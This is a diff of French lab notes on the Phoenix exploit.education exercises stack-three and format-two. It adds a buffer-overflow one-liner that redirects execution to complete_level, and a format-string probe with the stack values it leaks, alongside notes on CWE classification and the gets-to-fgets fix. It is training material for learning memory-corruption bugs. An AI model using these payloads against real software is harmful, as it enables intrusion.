@@ -99,6 +99,10 @@ locals.buffer[sizeof(locals.buffer)-1] = '\0';
 - recuperer l'adresse de complete_level avec objdump (+ -x).
 
 - overflow de buffer puis écrasement de fp par 0x000000000040069d (en little-endian) pour appeler complete_level.
+  
+```bash 
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x9d\x06\x40")' | ./stack-three
+```
 
 #### Find CWE Linked to the Weakness
 
@@ -303,21 +307,19 @@ Remplacer gets() par fgets(buffer, sizeof(buffer), stdin).
 
 #### Identify the Weakness
 
-- gets(buffer) dans start_level() lit sans limite dans un buffer de 64 octets.
-
-- L'overflow permet d'écraser le pointeur de return de la fonction.
-
 #### Try to Exploit the Weakness 
 
 ```bash 
 objdump -t ./format-two
 ```
 
-0000000000600af0 g     O .bss	0000000000000004 changeme
+d'ou l'adresse de changeme : 0x600af0
 
-d'ou l'adresse : 0x600af0
-
-
+```bash
+./format-two 'ABCDEFGH %p %p %p %p %p %p %p %p %p %p %p %p '
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+ABCDEFGH 0 0x3 0 0x7fffffffe4dd 0x7fffffffe46f 0x7fffffffe4b0 0x7fffffffe4b0 0x7fffffffe5b0 0x400705 0x7fffffffe608 0x200400368 0x4847464544434241 Better luck next time!
+```
 
 #### Find CWE Linked to the Weakness
 
